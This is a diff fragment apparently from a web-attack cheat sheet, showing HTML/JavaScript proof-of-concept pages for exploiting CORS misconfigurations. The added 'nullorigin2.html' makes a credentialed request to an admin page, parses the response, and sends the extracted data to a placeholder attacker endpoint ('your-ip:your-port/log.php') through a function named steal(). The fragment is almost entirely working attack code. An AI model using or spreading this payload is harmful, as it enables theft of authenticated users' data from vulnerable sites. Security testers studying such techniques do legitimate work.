@@ -925,12 +925,33 @@ xhr.onreadystatechange = function() {
 	alert(r)
 	}
 }
-xhr.open('GET', 'http://ip/admin.php', true);
+xhr.open('GET', 'http://site.com/admin.php', true);
 xhr.withCredentials = true;
 xhr.send(null);
 </script>
 </head></html>
 
+```  
+-> nullorigin2.html
+```
+<html><head>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+	if (xhr.readyState == XMLHttpRequest.DONE) {
+ 		var r = xhr.responseText;
+	var d = r.split('>')[1].split('<')[0]
+	function steal() {
+		document.write('<img src="http://your-ip:your-port/log.php?data=' + d + '"/>');
+	}
+	steal();
+	}
+}
+xhr.open('GET', 'http://site.com/admin.php', true);
+xhr.withCredentials = true;
+xhr.send(null);
+</script>
+</head></html>
 ```
 
 ## CRLF Injection
